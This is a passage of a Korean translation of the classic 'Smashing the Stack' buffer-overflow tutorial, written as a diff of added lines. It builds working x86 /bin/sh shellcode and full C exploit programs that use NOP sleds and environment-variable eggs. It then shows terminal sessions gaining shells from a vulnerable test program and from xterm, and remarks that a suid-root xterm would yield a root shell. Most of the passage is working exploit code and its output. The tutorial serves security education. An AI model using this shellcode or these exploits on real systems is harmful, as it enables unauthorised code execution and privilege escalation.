+명령을 사용하는 것이다. JMP와 CALL 명령은 IP 상대번지를 쓸 수 있다. 이것은
+우리가 뛰어 넘어가고 싶은 메모리의 정확한 주소를 알 필요가 없이 현재 IP로부터
+떨어진 곳으로 뛰어 넘어갈 수 있다는 것을 의미한다. 만약 우리가 CALL명령을 
+"/bin/sh"문자열 바로 앞에 위치시킨다면, 또 JMP명령 또한 위치시킨다면, 문자열의
+주소는 CALL이 실행될 때, 복귀주소로써 스택에 밀어 넣어질 것이다. 그러면, 우리가
+필요한 전부는 복귀주소를 레지스터로 복사하는 것이다. CALL명령은 단순히 위에
+있는 우리의 코드의 시작을 호출한다. J가 JMP명령을 나타내고, C가 CALL명령을
+나타내며 s는 문자열을 뜻한다고 생각하면, 실행흐름은 이제 다음과 같을 것이다: 
+
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+          buffer                sfp   ret   a     b     c
+
+<------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
+          ^|^             ^|            |
+          |||_____________||____________| (1)
+      (2)  ||_____________||
+            |______________| (3)
+top of                                                            bottom of
+stack                                                                 stack
+
+
+
+이 변경으로, 색인된 주소를 사용하고, 각각의 명령이 얼마나 많은 바이트를
+차지할 것인지 쓰면, 코드는 다음과 같다:
+
+------------------------------------------------------------------------------
+       jmp    offset-to-call           # 2 bytes
+       popl   %esi                     # 1 byte
+       movl   %esi,array-offset(%esi)  # 3 bytes
+       movb   $0x0,nullbyteoffset(%esi)# 4 bytes
+       movl   $0x0,null-offset(%esi)   # 7 bytes
+       movl   $0xb,%eax                # 5 bytes
+       movl   %esi,%ebx                # 2 bytes
+       leal   array-offset,(%esi),%ecx # 3 bytes
+       leal   null-offset(%esi),%edx   # 3 bytes
+       int    $0x80                    # 2 bytes
+       movl   $0x1, %eax                        # 5 bytes
+       movl   $0x0, %ebx                        # 5 bytes
+           int    $0x80                                    # 2 bytes
+       call   offset-to-popl           # 5 bytes
+       /bin/sh string goes here.
+------------------------------------------------------------------------------
+
+jmp에서 call까지의 거리, call에서 popl까지의 거리, 문자열의 주소에서 
+배열까지의 거리, 그리고 문자열의 주소에서 워드길이의 null까지의 거리를
+계산하면 이렇게 된다:
+
+------------------------------------------------------------------------------
+       jmp    0x26                     # 2 bytes
+       popl   %esi                     # 1 byte
+       movl   %esi,0x8(%esi)           # 3 bytes
+       movb   $0x0,0x7(%esi)                        # 4 bytes
+       movl   $0x0,0xc(%esi)           # 7 bytes
+       movl   $0xb,%eax                # 5 bytes
+       movl   %esi,%ebx                # 2 bytes
+       leal   0x8(%esi),%ecx           # 3 bytes
+       leal   0xc(%esi),%edx           # 3 bytes
+       int    $0x80                    # 2 bytes
+       movl   $0x1, %eax                        # 5 bytes
+       movl   $0x0, %ebx                        # 5 bytes
+           int    $0x80                                    # 2 bytes
+       call   -0x2b                    # 5 bytes
+       .string \"/bin/sh\"                        # 8 bytes
+------------------------------------------------------------------------------
+
+좋다. 정확하게 작동되는 가 확인하기 위해, 우리는 그것을 컴파일하고 실행해야 한다.
+하지만 문제가 있다. 우리의 코드는 자신을 수정하지만, 대부분의 운영체계는 코드부분을
+읽을 수만 있도록 표시한다. 이런 제한을 피하기 위해, 우리는 우리가 실행하고자 하는
+코드를 스택이나 데이터 지역에 위치시키고, 그것에 제어를 넘겨주어야 한다. 
+그렇게 하기 위해서는, 우리의 코드를 데이터 지역의 전역배열에 위치시킬 것이다. 우리는
+먼저 이진코드의 16진수 표현이 필요하다. 먼저 컴파일하고 그것을 얻기 위해, gdb를
+사용하자.
+
+shellcodeasm.c
+------------------------------------------------------------------------------
+void main() {
+__asm__("
+       jmp    0x2a                     # 2 bytes
+       popl   %esi                     # 1 byte
+       movl   %esi,0x8(%esi)           # 3 bytes
+       movb   $0x0,0x7(%esi)           # 4 bytes
+       movl   $0x0,0xc(%esi)           # 7 bytes
+       movl   $0xb,%eax                # 5 bytes
+       movl   %esi,%ebx                # 2 bytes
+       leal   0x8(%esi),%ecx           # 3 bytes
+       leal   0xc(%esi),%edx           # 3 bytes
+       int    $0x80                    # 2 bytes
+       movl   $0x1, %eax               # 5 bytes
+       movl   $0x0, %ebx               # 5 bytes
+       int    $0x80                    # 2 bytes
+       call   -0x2f                    # 5 bytes
+       .string \"/bin/sh\"             # 8 bytes
+");
+}
+------------------------------------------------------------------------------
+* 역자주 : 위 코드중 "jmp 0x2a  # 2 bytes"부분에서 원래 "# 3 bytes"로 되어 있었으나
+               잘못된 거 같아서 "2" 로 수정하였습니다.
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
+[aleph1]$ gdb shellcodeasm
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     jmp    0x800015f <main+47>
+0x8000135 <main+5>:     popl   %esi
+0x8000136 <main+6>:     movl   %esi,0x8(%esi)
+0x8000139 <main+9>:     movb   $0x0,0x7(%esi)
+0x800013d <main+13>:    movl   $0x0,0xc(%esi)
+0x8000144 <main+20>:    movl   $0xb,%eax
+0x8000149 <main+25>:    movl   %esi,%ebx
+0x800014b <main+27>:    leal   0x8(%esi),%ecx
+0x800014e <main+30>:    leal   0xc(%esi),%edx
+0x8000151 <main+33>:    int    $0x80
+0x8000153 <main+35>:    movl   $0x1,%eax
+0x8000158 <main+40>:    movl   $0x0,%ebx
+0x800015d <main+45>:    int    $0x80
+0x800015f <main+47>:    call   0x8000135 <main+5>
+0x8000164 <main+52>:    das
+0x8000165 <main+53>:    boundl 0x6e(%ecx),%ebp
+0x8000168 <main+56>:    das
+0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>
+0x800016b <main+59>:    addb   %cl,0x55c35dec(%ecx)
+End of assembler dump.
+(gdb) x/bx main+3
+0x8000133 <main+3>:     0xeb
+(gdb)
+0x8000134 <main+4>:     0x2a
+(gdb)
+.
+.
+.
+------------------------------------------------------------------------------
+
+testsc.c
+------------------------------------------------------------------------------
+char shellcode[] =
+           "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
+           "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+           "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
+           "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
+
+void main() {
+  int *ret;
+
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+
+}
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o testsc testsc.c
+[aleph1]$ ./testsc
+$ exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+작동한다! 하지만 장애물이 있다. 대부분의 경우, 우리는 문자버퍼를 오버플로우하려고
+할 것이다. 우리의 쉘코드 안에서 null바이트들은 문자열의 끝으로 여겨질 것이므로,
+복사는 종료될 것이다. 제대로 작동하기 위해서는 쉘코드에 null바이트가 없어야 한다.
+null바이트들을 제거해 보자(그리고 동시에 더 작게 만들자)
+
+          문제의 명령:                         대체된 명령:
+          --------------------------------------------------------
+          movb   $0x0,0x7(%esi)                xorl   %eax,%eax
+          molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
+                                               movl   %eax,0xc(%esi)
+          --------------------------------------------------------
+          movl   $0xb,%eax                     movb   $0xb,%al
+          --------------------------------------------------------
+          movl   $0x1, %eax                    xorl   %ebx,%ebx
+          movl   $0x0, %ebx                    movl   %ebx,%eax
+                                               inc    %eax
+          --------------------------------------------------------
+
+우리의 발전된 코드:
+
+shellcodeasm2.c
+------------------------------------------------------------------------------
+void main() {
+__asm__("
+       jmp    0x1f                     # 2 bytes
+       popl   %esi                     # 1 byte
+       movl   %esi,0x8(%esi)           # 3 bytes
+       xorl   %eax,%eax                # 2 bytes
+           movb   %eax,0x7(%esi)                        # 3 bytes
+       movl   %eax,0xc(%esi)           # 3 bytes
+       movb   $0xb,%al                 # 2 bytes
+       movl   %esi,%ebx                # 2 bytes
+       leal   0x8(%esi),%ecx           # 3 bytes
+       leal   0xc(%esi),%edx           # 3 bytes
+       int    $0x80                    # 2 bytes
+       xorl   %ebx,%ebx                # 2 bytes
+       movl   %ebx,%eax                # 2 bytes
+       inc    %eax                     # 1 bytes
+       int    $0x80                    # 2 bytes
+       call   -0x24                    # 5 bytes
+       .string \"/bin/sh\"             # 8 bytes
+                                                           # 46 bytes total
+");
+}
+------------------------------------------------------------------------------
+
+그리고 우리의 새로운 시험 프로그램:
+
+testsc2.c
+------------------------------------------------------------------------------
+char shellcode[] =
+           "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+           "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+           "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+void main() {
+  int *ret;
+
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+
+}
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o testsc2 testsc2.c
+[aleph1]$ ./testsc2
+$ exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+
+                              이용 프로그램 작성하기
+                             ~~~~~~~~~~~~~~~~~~~~~~~~
+                              (또는, 스택 개조하기)
+                             ~~~~~~~~~~~~~~~~~~~~~~~
+
+
+모든 조각들을 조합해 보자. 우리는 쉘코드를 가지고 있다. 우리는, 그것이 우리가 
+버퍼를 오버플로우하는 데 사용할 문자열의 부분이 되어야 한다는 것을 알고 있다.
+우리는, 복귀주소(RET)가 다시 버퍼를 가리키도록 해야 한다는 것을 알고 있다. 이 예제는
+이런 점들을 증명해 줄 것이다:
+
+overflow1.c
+------------------------------------------------------------------------------
+char shellcode[] =
+       "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+       "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+       "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+char large_string[128];
+
+void main() {
+ char buffer[96];
+ int i;
+ long *long_ptr = (long *) large_string;
+
+ for (i = 0; i < 32; i++)
+   *(long_ptr + i) = (int) buffer;
+
+ for (i = 0; i < strlen(shellcode); i++)
+   large_string[i] = shellcode[i];
+
+ strcpy(buffer,large_string);
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o exploit1 exploit1.c
+[aleph1]$ ./exploit1
+$ exit
+exit
+[aleph1]$
+------------------------------------------------------------------------------
+
+우리가 위에서 한 일은 large_string[]배열을 buffer[]의 주소(우리의 코드가 있게 될
+곳)로 가득채운 것이다. 그런다음, 쉘코드를 large_string 문자열의 처음에 복사한다.
+strcpy() 함수는 large_string을 buffer에 아무런 문자길이 확인도 하지 않은 채, 복사
+할 것이고, 우리의 코드가 있는 주소로 복귀주소(RET)를 덮어쓰면서 RET를 오버플로우
+할 것이다. main의 끝에 도달한 후에, 그것은 우리의 코드로 복귀되어 뛰어 넘어오려고
+하고, 쉘을 실행시킨다.
+
+또다른 프로그램의 버퍼를 오버플로우하려고 할 때 우리가 직면하는 문제는, 버퍼
+(즉, 우리의 코드)가 어느 주소에 있게 될지를 알아내려고 하는 것이다. 해답은 모든
+프로그램에서 스택은 같은 주소에서 시작할 것이라는 것이다. 대부분의 프로그램들은
+단 한번에 수백에서 수천 바이트 이상을 스택에 밀어 넣지 않는다. 그러므로, 스택이
+어디서 시작되는 가를 앎으로써, 우리는 우리가 오버플로우하려고 하는 버퍼가 어디에
+자리잡고 있는지를 추측할 수 있다. 다음은 자기 자신의 스택 포인터를 출력할 작은 
+프로그램이다:
+
+sp.c
+------------------------------------------------------------------------------
+unsigned long get_sp(void) {
+  __asm__("movl %esp,%eax");
+}
+void main() {
+ printf("0x%x\n", get_sp());
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ ./sp
+0x8000470
+[aleph1]$
+------------------------------------------------------------------------------
+
+이것이 바로 우리가 오버플로우하려는 프로그램이라고 생각하자:
+
+vulnerable.c
+------------------------------------------------------------------------------
+void main(int argc, char *argv[]) {
+ char buffer[512];
+
+ if (argc > 1)
+   strcpy(buffer,argv[1]);
+}
+------------------------------------------------------------------------------
+
+우리는 인자로써 버퍼크기와 스택 포인터(우리가 오버플로우하기를 원하는 버퍼가 
+위치할 지도 모르는)로부터의 거리를 취하는 프로그램을 만들 수 있다. 교묘하게
+조작하기 쉽도록, 우리는 오버플로우 문자열을 환경 변수에 밀어 넣을 것이다:
+
+exploit2.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+
+char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+  __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+ char *buff, *ptr;
+ long *addr_ptr, addr;
+ int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+ int i;
+
+ if (argc > 1) bsize  = atoi(argv[1]);
+ if (argc > 2) offset = atoi(argv[2]);
+
+ if (!(buff = malloc(bsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+
+ addr = get_sp() - offset;
+ printf("Using address: 0x%x\n", addr);
+
+ ptr = buff;
+ addr_ptr = (long *) ptr;
+ for (i = 0; i < bsize; i+=4)
+   *(addr_ptr++) = addr;
+
+ ptr += 4;
+ for (i = 0; i < strlen(shellcode); i++)
+   *(ptr++) = shellcode[i];
+
+ buff[bsize - 1] = '\0';
+
+ memcpy(buff,"EGG=",4);
+ putenv(buff);
+ system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+이제 우리는 버퍼와 거리(offset)이 얼마가 되어야 하는지 추측할 수 있다:
+
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit2 500
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+Illegal instruction
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600 100
+Using address: 0xbffffd4c
+[aleph1]$ ./vulnerable $EGG
+Segmentation fault
+[aleph1]$ exit
+[aleph1]$ ./exploit2 600 200
+Using address: 0xbffffce8
+[aleph1]$ ./vulnerable $EGG
+Segmentation fault
+[aleph1]$ exit
+.
+.
+.
+[aleph1]$ ./exploit2 600 1564
+Using address: 0xbffff794
+[aleph1]$ ./vulnerable $EGG
+$
+------------------------------------------------------------------------------
+
+우리도 알 수 있듯이, 이것은 효율적인 프로세스가 아니다. 심지어 스택이 어디서 
+시작되는 지를 알고 있는 상황에서도 거리(offset)을 추측하는 것은 거의 불가능하다.
+잘 해야 몇 백번, 최악의 경우 수 천번은 시도해야 할 것이다. 문제는 우리의 코드의
+주소가 어디서 시작되는지를 정확하게 추측해야 한다는 것이다. 만약 우리가 1바이트라도
+더 많이 혹은 더 적게 추측한다면, 우리는 지역침입 에러(segmentation violation)혹은
+잘못된 명령 에러(invalid instruction)을 겪게 될 것이다. 우리의 기회를 늘리는 한 방법은
+우리의 오버플로우 버퍼의 앞부분을 NOP명령으로 채우는 것이다. 대부분의 프로세서들은
+아무런 작업도 하지 않는 NOP명령을 가지고 있다. 그것은 보통 타이밍을 위한 목적으로
+실행을 지연시킬 때 사용된다. 우리는 그것을 사용할 것이고 우리의 오버플로우 버퍼의
+절반을 그것들로 채울것이다. 우리는 쉘코드를 한 가운데에 위치시킬 것이고, 그 뒤에
+복귀주소값들이 따를 것이다. 만약 우리가 운이 좋아서 복귀주소가 NOP들로 이루어진 
+문자열의 어느 곳이라도 가리킨다면,  우리의 코드에 도달하기까지 단지 실행될 것이다.
+Intel 아키텍처에서는 NOP명령이 1바이트를 차지하고 기계어로 0x90으로 번역된다.
+스택이 0xFF 주소에서 시작하고, S는 쉘코드, N은 NOP명령을 나타낸다고 생각하며,
+새로운 스택이 어떤 모양을 갖출지 살펴보자:
+
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+          buffer                sfp   ret   a     b     c
+
+<------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
+                ^                     |
+                |_____________________|
+top of                                                            bottom of
+stack                                                                 stack
+
+새로운 이용프로그램(exploit)은 다음과 같다:
+
+exploit3.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define NOP                            0x90
+
+char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+  __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+ char *buff, *ptr;
+ long *addr_ptr, addr;
+ int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+ int i;
+
+ if (argc > 1) bsize  = atoi(argv[1]);
+ if (argc > 2) offset = atoi(argv[2]);
+
+ if (!(buff = malloc(bsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+
+ addr = get_sp() - offset;
+ printf("Using address: 0x%x\n", addr);
+
+ ptr = buff;
+ addr_ptr = (long *) ptr;
+ for (i = 0; i < bsize; i+=4)
+   *(addr_ptr++) = addr;
+
+ for (i = 0; i < bsize/2; i++)
+   buff[i] = NOP;
+
+ ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+ for (i = 0; i < strlen(shellcode); i++)
+   *(ptr++) = shellcode[i];
+
+ buff[bsize - 1] = '\0';
+
+ memcpy(buff,"EGG=",4);
+ putenv(buff);
+ system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+우리가 오버플로우하려고 하는 버퍼의 크기보다 100바이트 정도 더 크게 선택을 
+한다고 해도 그것은 작동할 것이다. 이것은 NOP명령을 위한 많은 공간을 남기면서
+우리의 코드를 우리가 오버플로우하려는 버퍼의 끝에 위치시킬 것이다. 하지만 여전히
+우리가 추측한 주소로 복귀주소를 덮어쓴다. 우리가 오버플로우하려는 버퍼는 512바이트
+이므로 우리는 612를 쓸 것이다. 새로운 이용 프로그램으로 우리의 시험 프로그램을
+오버플로우 해보자:
+
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit3 612
+Using address: 0xbffffdb4
+[aleph1]$ ./vulnerable $EGG
+$
+------------------------------------------------------------------------------
+
+와! 첫번째 시도가 성공했다! 이 변화가 우리의 기회를 100배 증가시켰다. 버퍼
+오버플로우의 실제 경우에 한 번 시도해 보자. Xt 라이브러리 상의 버퍼 오버플로우를
+우리의 증명을 위해 사용할 것이다. 예를 들어, 우리는 xterm을 쓸 것이다(Xt 라이브러리와
+연결된 모든 프로그램들이 취약점을 가지고 있다). 여러분은 X 서버를 실행하고 있어야
+하며, 로컬 호스트로부터 서버의 접속을 허락해야 한다. DISPLAY 변수를 적절하게
+설정하라.
+
+------------------------------------------------------------------------------
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit3 1124
+Using address: 0xbffffdb4
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "?1짦F
+                          ?
+                           ?
+
+?ㅨ@ㅸ?��/bin/sh?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?
+
+
+
+
+
+
+
+
+�엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘
+
+
+
+
+
+
+
+
+?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?엘?�엘?엘?엘?엘?
+^C
+[aleph1]$ exit
+[aleph1]$ ./exploit3 2148 100
+Using address: 0xbffffd48
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "?1짦F
+                          ?
+                           ?
+
+?ㅨ@ㅸ?��/bin/sh?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?
+
+
+
+
+
+
+
+
+�풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥
+
+
+
+
+
+
+
+
+?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥??
+
+
+
+
+
+
+
+
+H?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?
+
+
+
+
+
+
+
+
+풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?풥?
+Warning: some arguments in previous message were lost
+Illegal instruction
+[aleph1]$ exit
+.
+.
+.
+[aleph1]$ ./exploit4 2148 600
+Using address: 0xbffffb54
+[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
+Warning: Color name "?1짦F
+                          ?
+                           ?
+
+?ㅨ@ㅸ?��/bin/sh?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?
+
+
+
+
+
+
+
+
+�풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲
+
+
+
+
+
+
+
+
+?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲??
+
+
+
+
+
+
+
+
+T?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?
+
+
+
+
+
+
+
+
+풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?풲?
+Warning: some arguments in previous message were lost
+bash$
+------------------------------------------------------------------------------
+
+유레카! 12번도 시도하지 않아서 우리는 마법의 수를 찾아냈다. 만약에 xterm이 
+suid root였다면 이것은 root쉘이 되었을 것이다.
+
+                            작은 버퍼 오버플로우
+                           ~~~~~~~~~~~~~~~~~~~~~~
+
+여러분이 오버플로우 하고자 하는 버퍼가 너무 작아서 쉘코드가 그것에 들어갈 수
+조차 없거나 우리 코드의 주소 대신에 명령들로 복귀주소를 덮어 쓰거나, 혹은 
+문자열의 앞부분을 채울 수 있는 NOP의 수가 너무 적어서 그들의 주소를 알아맞힐 
+확률이 거의 없을 때가 있을 것이다. 이런 프로그램들로부터 쉘을 얻기 위해서는,
+우리는 다른 방법을 써야 할 것이다. 이 특별한 접근은 여러분이 그 프로그램의 환경
+변수에 접근이 가능할 때만 유효할 것이다.
+
+우리가 할 일은 우리의 쉘코드를 환경변수에 위치시키고 나서 이 변수의 메모리상의
+주소로 버퍼를 오버플로우할 것이다. 이 방법은 또한 당신이 원하는 크기 만큼의
+쉘코드를 담을 수 있는 환경변수를 만들 수 있으므로, 성공 확률을 증가시킬 것이다.
+
+환경 변수들은 프로그램이 시작할 때, 스택의 꼭대기에 자리잡는다. setenv()에 의한
+어떠한 변경도 다른 곳에 할당된다. 그러면 프로그램이 시작할 때, 스택의 모습은
+다음과 같을 것이다:
+
+     <strings><argv pointers>NULL<envp pointers>NULL<argc><argv><envp>
+
+우리의 새로운 프로그램은 쉘코드와 NOP명령을 포함한 여분의 변수를 취할 것이다.
+우리의 새로운 프로그램은 이제 다음과 같다:
+
+exploit4.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+#define NOP                            0x90
+
+char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+  __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+ char *buff, *ptr, *egg;
+ long *addr_ptr, addr;
+ int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+ int i, eggsize=DEFAULT_EGG_SIZE;
+
+ if (argc > 1) bsize   = atoi(argv[1]);
+ if (argc > 2) offset  = atoi(argv[2]);
+ if (argc > 3) eggsize = atoi(argv[3]);
+
+
+ if (!(buff = malloc(bsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+ if (!(egg = malloc(eggsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+
+ addr = get_esp() - offset;
+ printf("Using address: 0x%x\n", addr);
+
+ ptr = buff;
+ addr_ptr = (long *) ptr;
+ for (i = 0; i < bsize; i+=4)
+   *(addr_ptr++) = addr;
+
+ ptr = egg;
+ for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+   *(ptr++) = NOP;
+
+ for (i = 0; i < strlen(shellcode); i++)
+   *(ptr++) = shellcode[i];
+
+ buff[bsize - 1] = '\0';
+ egg[eggsize - 1] = '\0';
+
+ memcpy(egg,"EGG=",4);
+ putenv(egg);
+ memcpy(buff,"RET=",4);
+ putenv(buff);
+ system("/bin/bash");
+}
+------------------------------------------------------------------------------
+
+취약성있는 시험 프로그램으로 새로운 프로그램을 한 번 시험해 보자:
+------------------------------------------------------------------------------
+[aleph1]$ ./exploit4 768
+Using address: 0xbffffdb0
+[aleph1]$ ./vulnerable $RET
+$
+------------------------------------------------------------------------------
+
+신통하게 작동한다. 그럼 이제 xterm에서 해 보자.
+
+------------------------------------------------------------------------------
+[aleph1]$ export DISPLAY=:0.0
+[aleph1]$ ./exploit4 2148
+Using address: 0xbffffdb0
+[aleph1]$ /usr/X11R6/bin/xterm -fg $RET
+Warning: Color name
+"갇�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?
+
+
+
+
+
